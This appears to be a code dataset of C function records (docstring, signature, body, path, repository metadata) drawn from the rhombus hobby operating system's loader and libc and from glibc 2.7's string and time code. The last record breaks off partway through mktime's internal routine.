{"docstring": "/*****************************************************************************\n * rcall\n *\n * Generic remote procedure call protocol. Sends a formatted string to the \n * given resource, and recieves a string in return. This function can be used \n * to implement any sort of ad-hoc textual protocol, and is a cover-all for \n * any things that cannot be done with the standard I/O and filesystem \n * routines. Returns NULL on error or empty return string.\n */\n", "func_signal": "char *rcall(rp_t rp, rk_t key, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\tchar *args;\n\tchar *ret;\n\n\tif (strchr(fmt, '%')) {\n\n\t\t// format argument string\n\t\tva_start(ap, fmt);\n\t\targs = vsaprintf(fmt, ap);\n\t\tva_end(ap);\n\n\t\tif (!args) {\n\t\t\treturn NULL;\n\t\t}\n\n\t\t// perform rcall\n\t\tret = __rcall(rp, key, args);\n\n\t\t// free argument string\n\t\tfree(args);\n\t}\n\telse {\n\t\t\n\t\t// just use the format string\n\t\tret = __rcall(rp, key, fmt);\n\t}\n\n\treturn ret;\n}", "path": "libc\\rhombus\\rcall.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * elf_gencache\n *\n * Generate an ELF cached image from an ELF <loaded?> image, storing the \n * cache data in <cache>. This cache data is used to make lookups of various \n * information about the image much faster.\n */\n", "func_signal": "void elf_gencache(struct elf_cache *cache, const struct elf32_ehdr *image, int loaded)", "code": "{\n\tuint32_t base = (uintptr_t) image;\n\tsize_t i;\n\n\tmemclr(cache, sizeof(struct elf_cache));\n\n\t/* save image location */\n\tcache->image = image;\n\n\t/* get segment table */\n\tcache->segtab = (const struct elf32_phdr*) (image->e_phoff + (uintptr_t) image);\n\n\t/* calulate image size */\n\tfor (i = 0; i < cache->image->e_phnum; i++) {\n\t\tif ((cache->segtab[i].p_vaddr + cache->segtab[i].p_memsz) > cache->vsize) {\n\t\t\tcache->vsize = cache->segtab[i].p_vaddr + cache->segtab[i].p_memsz;\n\t\t}\n\t}\n\n\t/* adjust base for executables */\n\tif (image->e_type == ET_EXEC) {\n\t\tbase -= (cache->segtab[0].p_vaddr - cache->segtab[0].p_offset);\n\t}\n\n\t/* get DYNAMIC segment */\n\tfor (i = 0; cache->segtab[i].p_type != PT_NULL; i++) {\n\t\tif (cache->segtab[i].p_type == PT_DYNAMIC) {\n\t\t\tcache->dynamic = (const struct elf32_dyn*) \n\t\t\t\t((!loaded || image->e_type == ET_DYN) \n\t\t\t\t\t? (uintptr_t) image + cache->segtab[i].p_offset\n\t\t\t\t\t: cache->segtab[i].p_vaddr);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t/* get various DYNAMIC segment values */\n\tif (!cache->dynamic) return;\n\tfor (i = 0; cache->dynamic[i].tag != DT_NULL; i++) {\n\t\tswitch (cache->dynamic[i].tag) {\n\t\tcase DT_SYMTAB:   cache->symtab  = (const struct elf32_sym*) (base + cache->dynamic[i].val); break;\n\t\tcase DT_REL:      cache->reltab  = (const struct elf32_rel*) (base + cache->dynamic[i].val); break;\n\t\tcase DT_RELSZ:    cache->reltabn = cache->dynamic[i].val / 8; break;\n\t\tcase DT_JMPREL:   cache->jmprel  = (const struct elf32_rel*) (base + cache->dynamic[i].val); break;\n\t\tcase DT_PLTRELSZ: cache->jmpreln = cache->dynamic[i].val / 8; break;\n\t\tcase DT_STRTAB:   cache->strtab  = (const char*) (base + cache->dynamic[i].val); break;\n\t\tcase DT_PLTGOT:   cache->pltgot  = (const uint32_t*) (base + cache->dynamic[i].val); break;\n\t\tcase DT_HASH:     cache->hash    = (const uint32_t*) (base + cache->dynamic[i].val); break;\n\t\tcase DT_SONAME:   cache->soname  = (const char*) cache->dynamic[i].val; break;\n\t\tcase DT_INIT:     cache->init    = (void (*) (void)) (base + cache->dynamic[i].val); break;\n\t\tcase DT_FINI:     cache->fini    = (void (*) (void)) (base + cache->dynamic[i].val); break;\n\t\t}\n\t}\n\n\t/* lookup soname */\n\tcache->soname = (cache->soname) ? &cache->strtab[(uintptr_t) cache->soname] : NULL;\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/****************************************************************************\n * reset\n *\n * Deletes the contents of the file <file>.\n */\n", "func_signal": "int rp_reset(uint64_t file, rk_t key)", "code": "{\n\tstruct msg *msg;\n\n\tmsg = aalloc(sizeof(struct msg), PAGESZ);\n\tif (!msg) return 1;\n\tmsg->source = RP_CURRENT_THREAD;\n\tmsg->target = file;\n\tmsg->key    = key;\n\tmsg->length = 0;\n\tmsg->action = ACTION_RESET;\n\tmsg->arch   = ARCH_NAT;\n\n\tif (msend(msg)) return 1;\n\tmsg = mwait(ACTION_REPLY, file);\n\n\tfree(msg);\n\treturn 0;\n}", "path": "libc\\natio\\reset.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/****************************************************************************\n * strvcat\n *\n * Concatenates a list of strings and returns the result as a buffer in\n * the global heap. Returns NULL on error.\n */\n", "func_signal": "char *strvcat(const char *s1, ...)", "code": "{\n\tva_list ap;\n\tconst char *argv[16];\n\tchar *fullstring;\n\tsize_t i, length, pos;\n\n\tva_start(ap, s1);\n\n\targv[0] = s1;\n\t\n\tfor (i = 1; i < 16; i++) {\n\t\targv[i] = va_arg(ap, const char*);\n\t\tif (!argv[i]) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tfor (length = 0, i = 0; i < 16 && argv[i]; i++) {\n\t\tlength += strlen(argv[i]);\n\t}\n\n\tfullstring = malloc(length + 1);\n\n\tif (!fullstring) {\n\t\terrno = ENOMEM;\n\t\treturn NULL;\n\t}\n\n\tfullstring[0] = '\\0';\n\n\tfor (i = 0, pos = 0; i < 16 && argv[i]; i++) {\n\t\tstrcat(&fullstring[pos], argv[i]);\n\t\tpos += strlen(argv[i]);\n\t}\n\n\treturn fullstring;\n}", "path": "libc\\string\\strvcat.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * elfc_relocate_all\n *\n * Perform all initial relocations on the cached ELF image <cache>.\n */\n", "func_signal": "void elfc_relocate_all(struct elf_cache *cache)", "code": "{\n\tsize_t i;\n\n\t/* only relocate dynamic objects */\n\tif (!cache->dynamic) {\n\t\treturn;\n\t}\n\t\n\t/* add special entries to GOT for PLT resolution */\n\tif (cache->pltgot) {\n\t\t((uint32_t*) cache->pltgot)[1] = (uint32_t) cache->image;\n\t\t((uint32_t*) cache->pltgot)[2] = (uint32_t) __plt_resolve;\n\t}\n\n\t/* perform normal relocations (data) */\n\tif (cache->reltab) {\n\t\tfor (i = 0; i < cache->reltabn; i++) {\n\t\t\telfc_relocate(cache, &cache->reltab[i]);\n\t\t}\n\t}\n\n\t/* do stub relocations for PLT GOT entries */\n\tif (cache->image->e_type == ET_DYN && cache->jmprel) {\n\t\tfor (i = 0; i < cache->jmpreln; i++) {\n\t\t\t((uint32_t*) cache->image)[cache->jmprel[i].r_offset / 4] += (uint32_t) cache->image;\n\t\t}\n\t}\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * elfc_relocate_now\n *\n * Perform all initial relocations on the cached ELF image <cache>, including\n * PLT relocations.\n */\n", "func_signal": "void elfc_relocate_now(struct elf_cache *cache)", "code": "{\n\tsize_t i;\n\n\t/* only relocate dynamic objects */\n\tif (!cache->dynamic) {\n\t\treturn;\n\t}\n\t\n\t/* add special entries to GOT for PLT resolution */\n\tif (cache->pltgot) {\n\t\t((uint32_t*) cache->pltgot)[1] = (uint32_t) cache->image;\n\t\t((uint32_t*) cache->pltgot)[2] = (uint32_t) __plt_resolve;\n\t}\n\n\t/* perform normal relocations (data) */\n\tif (cache->reltab) {\n\t\tfor (i = 0; i < cache->reltabn; i++) {\n\t\t\telfc_relocate(cache, &cache->reltab[i]);\n\t\t}\n\t}\n\n\t/* do full relocations for PLT GOT entries */\n\tif (cache->image->e_type == ET_DYN && cache->jmprel) {\n\t\tfor (i = 0; i < cache->jmpreln; i++) {\n\t\t\telfc_relocate(cache, &cache->jmprel[i]);\n\t\t}\n\t}\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * __rcall\n *\n * Generic remote procedure call protocol. Sends a string to the given\n * resource, and recieves a string in return. This function can be used to\n * implement any sort of ad-hoc textual protocol, and is a cover-all for any\n * things that cannot be done with the standard I/O and filesystem routines.\n * Returns NULL on error or empty return string.\n *\n * protocol:\n *   port: ACTION_RCALL\n *\n *   request:\n *     char args[]\n *\n *   reply:\n *     char rets[]\n */\n", "func_signal": "static char *__rcall(rp_t rp, rk_t key, const char *args)", "code": "{\n\tstruct msg *msg;\n\tsize_t length;\n\tchar *rets;\n\n\tlength = strlen(args) + 1;\n\n\tmsg = aalloc(sizeof(struct msg) + length, PAGESZ);\n\tif (!msg) return NULL;\n\tmsg->source = RP_CURRENT_THREAD;\n\tmsg->target = rp;\n\tmsg->key    = key;\n\tmsg->length = length;\n\tmsg->action = ACTION_RCALL;\n\tmsg->arch   = ARCH_NAT;\n\tmemcpy(msg->data, args, length);\n\n\tif (msend(msg)) return NULL;\n\tmsg = mwait(ACTION_REPLY, rp);\n\n\tif (msg->length && msg->data[0] != '\\0') {\n\t\trets = strdup((char*) msg->data);\n\t}\n\telse {\n\t\trets = NULL;\n\t}\n\n\tfree(msg);\n\treturn rets;\n}", "path": "libc\\rhombus\\rcall.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * elf_resolve_local\n *\n * Find the active value of the symbol <symbol> in the cached ELF image\n * <cache>. Returns 0 on failure.\n */\n", "func_signal": "static uint32_t elfc_resolve_local(struct elf_cache *cache, const char *symbol)", "code": "{\n\tconst struct elf32_sym *syment;\n\n\tsyment = elfc_get_symbol(cache, symbol);\n\tif (!syment || !syment->st_value) {\n\t\treturn 0;\n\t}\n\n\treturn (syment->st_value + (uint32_t) cache->image);\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * elfc_relocate\n *\n * Perform the relocation <rel> on the cached ELF image <cache>.\n */\n", "func_signal": "uint32_t elfc_relocate(struct elf_cache *cache, const struct elf32_rel *rel)", "code": "{\n\tconst struct elf32_sym *symbol = NULL;\n\tuint32_t *image32;\n\tuint32_t symbol_value;\n\n\t/* compute symbol value if needed */\n\tswitch (ELF32_R_TYPE(rel->r_info)) {\n\tcase R_386_GLOB_DAT:\n\tcase R_386_JMP_SLOT:\n\tcase R_386_32:\n\t\tsymbol = &cache->symtab[ELF32_R_SYM(rel->r_info)];\n\n\t\tif (symbol->st_value) {\n\t\t\tsymbol_value = symbol->st_value;\n\n\t\t\tif (cache->image->e_type != ET_EXEC) {\n\t\t\t\tsymbol_value += (uint32_t) cache->image;\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tsymbol_value = elfc_resolve(cache, &cache->strtab[symbol->st_name]);\n\t\t}\n\n\t\tbreak;\n\tdefault:\n\t\tsymbol_value = 0;\n\t}\n\n\timage32 = (void*) ((cache->image->e_type == ET_EXEC) ? 0 : cache->image);\n\n\t/* perform relocation */\n\tswitch (ELF32_R_TYPE(rel->r_info)) {\n\tcase R_386_NONE:\n\t\tbreak;\n\tcase R_386_RELATIVE:\n\t\timage32[rel->r_offset / 4] += (uint32_t) cache->image;\n\t\tbreak;\n\tcase R_386_GLOB_DAT:\n\tcase R_386_JMP_SLOT:\n\t\timage32[rel->r_offset / 4] = symbol_value;\n\t\tbreak;\n\tcase R_386_32:\n\t\timage32[rel->r_offset / 4] += symbol_value;\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n\n\treturn symbol_value;\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/****************************************************************************\n * puts\n *\n * Writes the string <s> and a trailing newline to stdout. Returns 0 on\n * success, nonzero on error.\n */\n", "func_signal": "int puts(const char *s)", "code": "{\n\n\tif (fputs(s, stdout)) {\n\t\treturn -1;\n\t}\n\telse {\n\t\tfputc('\\n', stdout);\n\t\treturn 0;\n\t}\n}", "path": "libc\\stdio\\puts.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/****************************************************************************\n * fb_fill\n *\n * Fill region with coordinates (<x>, <y>) and dimensions <w> by <h>,\n * applying alpha effects. Returns zero on success, nonzero on error.\n */\n", "func_signal": "int fb_fill(struct fb *fb, int x, int y, int w, int h, uint32_t color)", "code": "{\n\tint i, j;\n\t\n\tif (!fb) {\n\t\treturn 1;\n\t}\n\n\t// bounds check\n\tif (x < 0 || y < 0 || y + h > fb->ydim || x + w > fb->xdim) {\n\t\treturn 1;\n\t}\n\n\tmutex_spin(&fb->mutex);\n\n\t// set pixel value\n\tfor (i = y; i < y + h && i < fb->ydim; i++) {\n\t\tfor (j = x; j < x + w && j < fb->xdim; j++) {\n\t\t\tfb->bitmap[j + i * fb->xdim] = color;\n\t\t}\n\t}\n\n\t// update flip acceleration\n\tif (fb->minx >  x)     fb->minx = x;\n\tif (fb->maxx <= x + w) fb->maxx = x + w+ 1;\n\tif (fb->miny >  y)     fb->miny = y;\n\tif (fb->maxy <= y + h) fb->maxy = y + h + 1;\n\n\tmutex_free(&fb->mutex);\n\n\treturn 0;\n}", "path": "libc\\graph\\fb_fill.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * rcall_hook\n *\n * Sets the rcall hook to be called when an rcall to function <func> is sent \n * to this process at target index 0.\n */\n", "func_signal": "int rcall_hook(const char *func, rcall_hook_t hook)", "code": "{\n\t_rcall_table = s_table_set(_rcall_table, func, (void*) hook);\n\n\treturn 0;\n}", "path": "libc\\rhombus\\rcall.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * elfc_get_symbol\n *\n * Find the symbol table entry for the symbol <symbol> in the cached ELF \n * image <cache>. Returns NULL on failure.\n */\n", "func_signal": "static const struct elf32_sym *elfc_get_symbol(struct elf_cache *cache, const char *symbol)", "code": "{\n\tconst uint32_t *bucket;\n\tconst uint32_t *chain;\n\tuint32_t nbucket;\n\tuint32_t nchain;\n\tuint32_t hash;\n\tuint32_t i;\n\n\tnbucket = cache->hash[0];\n\tnchain  = cache->hash[1];\n\tbucket = &cache->hash[2];\n\tchain  = &cache->hash[2 + nbucket];\n\n\thash = elfc_hash(symbol) % nbucket;\n\ti = bucket[hash];\n\twhile (1) {\n\n\t\tif (i == 0) {\n\t\t\treturn NULL;\n\t\t}\n\n\t\tif (!strcmp(&cache->strtab[cache->symtab[i].st_name], symbol)) {\n\t\t\t/* found symbol */\n\t\t\treturn &cache->symtab[i];\n\t\t}\n\n\t\ti = chain[i];\n\t}\n\n\treturn NULL;\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * elfc_get_needed\n *\n * Return a pointer to the <index>th shared object requested to be loaded by\n * the cached ELF image <cache>.\n */\n", "func_signal": "static const struct elf32_ehdr *elfc_get_needed(struct elf_cache *cache, size_t index)", "code": "{\n\tconst struct slt32_entry *slt;\n\tconst char *soname;\n\tchar objname[28];\n\tsize_t i;\n\n\tsoname = NULL;\n\tfor (i = 0; cache->dynamic[i].tag != DT_NULL; i++) {\n\t\tif (cache->dynamic[i].tag == DT_NEEDED) {\n\t\t\tif (!index--) {\n\t\t\t\tsoname = &cache->strtab[cache->dynamic[i].val];\n\t\t\t}\n\t\t}\n\t}\n\n\tif (!soname) {\n\t\treturn NULL;\n\t}\n\n\tstrlcpy(objname, \"dl.obj:\", 28);\n\tstrlcat(objname, soname, 28);\n\n\tslt = sltget_name(objname);\n\n\tif (!slt) {\n\t\treturn NULL;\n\t}\n\n\treturn (const void*) slt->base;\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * fb_resize\n *\n * Resizes bitmap of the framebuffer <fb> to <xdim> by <ydim>.\n * Returns zero on success, nonzero on failure.\n */\n", "func_signal": "int fb_resize(struct fb *fb, int xdim, int ydim)", "code": "{\n\n\tif (!fb) {\n\t\treturn 1;\n\t}\n\n\tif (xdim == fb->xdim && ydim == fb->ydim) {\n\t\t// nothing to do\n\t\treturn 0;\n\t}\n\n\t// resize bitmap\n\tfb->xdim = xdim;\n\tfb->ydim = ydim;\n\tfree(fb->bitmap);\n\tfb->bitmap = aalloc(sizeof(uint32_t) * xdim * ydim, PAGESZ);\n\n\tif (fb->flags & FB_SHARED) {\n\t\t// re-acquire shared memory\n\t\trp_mmap(fb->rp, fd_getkey(fb->fd, AC_WRITE), \n\t\t\tfb->bitmap, xdim * ydim * sizeof(uint32_t), 0, PROT_READ | PROT_WRITE);\n\t}\n\n\t// reset flip acceleration\n\tfb->minx = fb->xdim + 1;\n\tfb->miny = fb->ydim + 1;\n\tfb->maxx = 0;\n\tfb->maxy = 0;\n\n\treturn 0;\n}", "path": "libc\\graph\\fb_resize.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/****************************************************************************\n * fdopen\n *\n * Create a stream from the file descriptor <fd> with mode <mode>. Returns\n * a pointer to the new stream on success, NULL on failure.\n */\n", "func_signal": "FILE *fdopen(int fd, const char *mode)", "code": "{\n\tFILE *stream;\n\tint status;\n\t\n\tif (fd < 0) {\n\t\treturn NULL;\n\t}\n\n\t// check mode\n\tif (mode[0] != 'a' && mode[0] != 'w' && mode[0] != 'r') {\n\t\terrno = EINVAL;\n\t\treturn NULL;\n\t}\n\n\t// check if the object is not a file\n\tif (!rp_type(fd_rp(fd), \"file\")) {\n\t\terrno = EISDIR;\n\t\treturn NULL;\n\t}\n\n\tstatus = 0;\n\n\t// check read permissions\n\tif (mode[0] == 'r' || mode[1] == '+') {\n\t\tstatus |= ACCS_READ;\n\t}\n\n\t// check write permissions\n\tif (mode[0] == 'w' || mode[0] == 'a' || mode[1] == '+') {\n\t\tstatus |= ACCS_WRITE;\n\t}\n\n\t// open file for real\n\tfd = ropen(fd, fd_rp(fd), status);\n\tif (fd < 0) {\n\t\treturn NULL;\n\t}\n\n\t// reset (erase) the file contents\n\tif (mode[0] == 'w') {\n\t\trp_reset(fd_rp(fd), fd_getkey(fd, AC_WRITE));\n\t}\n\n\tstream = calloc(sizeof(FILE), 1);\n\n\tif (!stream) {\n\t\terrno = ENOMEM;\n\t\treturn NULL;\n\t}\n\n\tstream->fd       = fd;\n\tstream->mutex    = false;\n\tstream->position = 0;\n\tstream->size     = rp_size(fd_rp(fd));\n\tstream->buffer   = NULL;\n\tstream->buffsize = 0;\n\tstream->buffpos  = 0;\n\tstream->revbuf   = EOF;\n\tstream->flags    = FILE_NBF | FILE_READ;\n\n\tif (mode[0] == 'w' || mode[0] == 'a' || mode[1] == '+') {\n\t\tstream->flags |= FILE_WRITE;\n\t}\n\n\t// position the stream properly\n\tif (mode[0] == 'a' && mode[1] != '+') {\n\t\tfseek(stream, 0, SEEK_END);\n\t}\n\telse {\n\t\tfseek(stream, 0, SEEK_SET);\n\t}\n\n\treturn stream;\n}", "path": "libc\\stdio\\fdopen.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/*****************************************************************************\n * elfc_resolve\n *\n * Find the active value of the symbol <symbol> by performing a breadth-first \n * search on the dependency tree of <cache>. If no matching symbol is found, \n * 0 is returned.\n */\n", "func_signal": "uint32_t elfc_resolve(struct elf_cache *cache, const char *symbol)", "code": "{\n\tuint32_t value;\n\tuint32_t depth;\n\t\n\tfor (depth = 0; depth < 10; depth++) {\n\t\tvalue = elfc_resolve_rec(cache, symbol, depth);\n\t\t\n\t\tif (value) {\n\t\t\treturn value;\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "dl\\elfc.c", "repo_name": "nickbjohnson4224/rhombus", "stars": 57, "license": "isc", "language": "c", "size": 47098}
{"docstring": "/* Complain if condition is not true.  */\n", "func_signal": "static void\ncheck (int thing, int number)", "code": "{\n  if (!thing)\n    {\n      printf(\"%s flunked test %d\\n\", it, number);\n      ++errors;\n    }\n}", "path": "bin\\glibc-2.7\\string\\tester.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Returns a pointer to the value portion of the entry in ENVZ for NAME, or 0\n   if there is none.  */\n", "func_signal": "char *\nenvz_get (const char *envz, size_t envz_len, const char *name)", "code": "{\n  char *entry = envz_entry (envz, envz_len, name);\n  if (entry)\n    {\n      while (*entry && *entry != SEP)\n\tentry++;\n      if (*entry)\n\tentry++;\n      else\n\tentry = 0;\t\t/* A null entry.  */\n    }\n  return entry;\n}", "path": "bin\\glibc-2.7\\string\\envz.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* The user specified a hand-made timezone, but not its DST rules.\n   We will use the names and offsets from the user, and the rules\n   from the TZDEFRULES file.  */\n", "func_signal": "void\n__tzfile_default (const char *std, const char *dst,\n\t\t  long int stdoff, long int dstoff)", "code": "{\n  size_t stdlen = strlen (std) + 1;\n  size_t dstlen = strlen (dst) + 1;\n  size_t i;\n  int isdst;\n  char *cp;\n\n  __tzfile_read (TZDEFRULES, stdlen + dstlen, &cp);\n  if (!__use_tzfile)\n    return;\n\n  if (num_types < 2)\n    {\n      __use_tzfile = 0;\n      return;\n    }\n\n  /* Ignore the zone names read from the file and use the given ones\n     instead.  */\n  __mempcpy (__mempcpy (cp, std, stdlen), dst, dstlen);\n  zone_names = cp;\n\n  /* Now there are only two zones, regardless of what the file contained.  */\n  num_types = 2;\n\n  /* Now correct the transition times for the user-specified standard and\n     daylight offsets from GMT.  */\n  isdst = 0;\n  for (i = 0; i < num_transitions; ++i)\n    {\n      struct ttinfo *trans_type = &types[type_idxs[i]];\n\n      /* We will use only types 0 (standard) and 1 (daylight).\n\t Fix up this transition to point to whichever matches\n\t the flavor of its original type.  */\n      type_idxs[i] = trans_type->isdst;\n\n      if (trans_type->isgmt)\n\t/* The transition time is in GMT.  No correction to apply.  */ ;\n      else if (isdst && !trans_type->isstd)\n\t/* The type says this transition is in \"local wall clock time\", and\n\t   wall clock time as of the previous transition was DST.  Correct\n\t   for the difference between the rule's DST offset and the user's\n\t   DST offset.  */\n\ttransitions[i] += dstoff - rule_dstoff;\n      else\n\t/* This transition is in \"local wall clock time\", and wall clock\n\t   time as of this iteration is non-DST.  Correct for the\n\t   difference between the rule's standard offset and the user's\n\t   standard offset.  */\n\ttransitions[i] += stdoff - rule_stdoff;\n\n      /* The DST state of \"local wall clock time\" for the next iteration is\n\t as specified by this transition.  */\n      isdst = trans_type->isdst;\n    }\n\n  /* Now that we adjusted the transitions to the requested offsets,\n     reset the rule_stdoff and rule_dstoff values appropriately.  They\n     are used elsewhere.  */\n  rule_stdoff = stdoff;\n  rule_dstoff = dstoff;\n\n  /* Reset types 0 and 1 to describe the user's settings.  */\n  types[0].idx = 0;\n  types[0].offset = stdoff;\n  types[0].isdst = 0;\n  types[1].idx = stdlen;\n  types[1].offset = dstoff;\n  types[1].isdst = 1;\n\n  /* Reset the zone names to point to the user's names.  */\n  __tzname[0] = (char *) std;\n  __tzname[1] = (char *) dst;\n\n  /* Set the timezone.  */\n  __timezone = -types[0].offset;\n\n  compute_tzname_max (stdlen + dstlen);\n}", "path": "bin\\glibc-2.7\\time\\tzfile.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Adds an entry for NAME with value VALUE to ENVZ & ENVZ_LEN.  If an entry\n   with the same name already exists in ENVZ, it is removed.  If VALUE is\n   NULL, then the new entry will a special null one, for which envz_get will\n   return NULL, although envz_entry will still return an entry; this is handy\n   because when merging with another envz, the null entry can override an\n   entry in the other one.  Null entries can be removed with envz_strip ().  */\n", "func_signal": "error_t\nenvz_add (char **envz, size_t *envz_len, const char *name, const char *value)", "code": "{\n  envz_remove (envz, envz_len, name);\n\n  if (value)\n    /* Add the new value, if there is one.  */\n    {\n      size_t name_len = strlen (name);\n      size_t value_len = strlen (value);\n      size_t old_envz_len = *envz_len;\n      size_t new_envz_len = old_envz_len + name_len + 1 + value_len + 1;\n      char *new_envz = realloc (*envz, new_envz_len);\n\n      if (new_envz)\n\t{\n\t  memcpy (new_envz + old_envz_len, name, name_len);\n\t  new_envz[old_envz_len + name_len] = SEP;\n\t  memcpy (new_envz + old_envz_len + name_len + 1, value, value_len);\n\t  new_envz[new_envz_len - 1] = 0;\n\n\t  *envz = new_envz;\n\t  *envz_len = new_envz_len;\n\n\t  return 0;\n\t}\n      else\n\treturn ENOMEM;\n    }\n  else\n    /* Add a null entry.  */\n    return __argz_add (envz, envz_len, name);\n}", "path": "bin\\glibc-2.7\\string\\envz.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Convert *TP to a time_t value.  */\n", "func_signal": "time_t\nmktime (struct tm *tp)", "code": "{\n#ifdef _LIBC\n  /* POSIX.1 8.1.1 requires that whenever mktime() is called, the\n     time zone names contained in the external variable `tzname' shall\n     be set as if the tzset() function had been called.  */\n  __tzset ();\n#endif\n\n  return __mktime_internal (tp, __localtime_r, &localtime_offset);\n}", "path": "bin\\glibc-2.7\\time\\mktime.c", "repo_name": "noahhl/rookonheroku", "stars": 32, "license": "None", "language": "c", "size": 73962}
{"docstring": "/* Convert *TP to a time_t value, inverting\n   the monotonic and mostly-unit-linear conversion function CONVERT.\n   Use *OFFSET to keep track of a guess at the offset of the result,\n   compared to what the result would be for UTC without leap seconds.\n   If *OFFSET's guess is correct, only one CONVERT call is needed.\n   This function is external because it is used also by timegm.c.  */\n", "func_signal": "time_t\n__mktime_internal (struct tm *tp,\n\t\t   struct tm *(*convert) (const time_t *, struct tm *),\n\t\t   time_t *offset)", "code": "{\n  time_t t, gt, t0, t1, t2;\n  struct tm tm;\n\n  /* The maximum number of probes (calls to CONVERT) should be enough\n     to handle any combinations of time zone rule changes, solar time,\n     leap seconds, and oscillations around a spring-forward gap.\n     POSIX.1 prohibits leap seconds, but some hosts have them anyway.  */\n  int remaining_probes = 6;\n\n  /* Time requested.  Copy it in case CONVERT modifies *TP; this can\n     occur if TP is localtime's returned value and CONVERT is localtime.  */\n  int sec = tp->tm_sec;\n  int min = tp->tm_min;\n  int hour = tp->tm_hour;\n  int mday = tp->tm_mday;\n  int mon = tp->tm_mon;\n  int year_requested = tp->tm_year;\n  int isdst = tp->tm_isdst;\n\n  /* 1 if the previous probe was DST.  */\n  int dst2;\n\n  /* Ensure that mon is in range, and set year accordingly.  */\n  int mon_remainder = mon % 12;\n  int negative_mon_remainder = mon_remainder < 0;\n  int mon_years = mon / 12 - negative_mon_remainder;\n  long int lyear_requested = year_requested;\n  long int year = lyear_requested + mon_years;\n\n  /* The other values need not be in range:\n     the remaining code handles minor overflows correctly,\n     assuming int and time_t arithmetic wraps around.\n     Major overflows are caught at the end.  */\n\n  /* Calculate day of year from year, month, and day of month.\n     The result need not be in range.  */\n  int mon_yday = ((__mon_yday[leapyear (year)]\n\t\t   [mon_remainder + 12 * negative_mon_remainder])\n\t\t  - 1);\n  long int lmday = mday;\n  long int yday = mon_yday + lmday;\n\n  time_t guessed_offset = *offset;\n\n  int sec_requested = sec;\n\n  if (LEAP_SECONDS_POSSIBLE)\n    {\n      /* Handle out-of-range seconds specially,\n\t since ydhms_tm_diff assumes every minute has 60 seconds.  */\n      if (sec < 0)\n\tsec = 0;\n      if (59 < sec)\n\tsec = 59;\n    }\n\n  /* Invert CONVERT by probing.  First assume the same offset as last\n     time.  */\n\n  t0 = ydhms_diff (year, yday, hour, min, sec,\n\t\t   EPOCH_YEAR - TM_YEAR_BASE, 0, 0, 0, - guessed_offset);\n\n  if (TIME_T_MAX / INT_MAX / 366 / 24 / 60 / 60 < 3)\n    {\n      /* time_t isn't large enough to rule out overflows, so check\n\t for major overflows.  A gross check suffices, since if t0\n\t has overflowed, it is off by a multiple of TIME_T_MAX -\n\t TIME_T_MIN + 1.  So ignore any component of the difference\n\t that is bounded by a small value.  */\n\n      /* Approximate log base 2 of the number of time units per\n\t biennium.  A biennium is 2 years; use this unit instead of\n\t years to avoid integer overflow.  For example, 2 average\n\t Gregorian years are 2 * 365.2425 * 24 * 60 * 60 seconds,\n\t which is 63113904 seconds, and rint (log2 (63113904)) is\n\t 26.  */\n      int ALOG2_SECONDS_PER_BIENNIUM = 26;\n      int ALOG2_MINUTES_PER_BIENNIUM = 20;\n      int ALOG2_HOURS_PER_BIENNIUM = 14;\n      int ALOG2_DAYS_PER_BIENNIUM = 10;\n      int LOG2_YEARS_PER_BIENNIUM = 1;\n\n      int approx_requested_biennia =\n\t(SHR (year_requested, LOG2_YEARS_PER_BIENNIUM)\n\t - SHR (EPOCH_YEAR - TM_YEAR_BASE, LOG2_YEARS_PER_BIENNIUM)\n\t + SHR (mday, ALOG2_DAYS_PER_BIENNIUM)\n\t + SHR (hour, 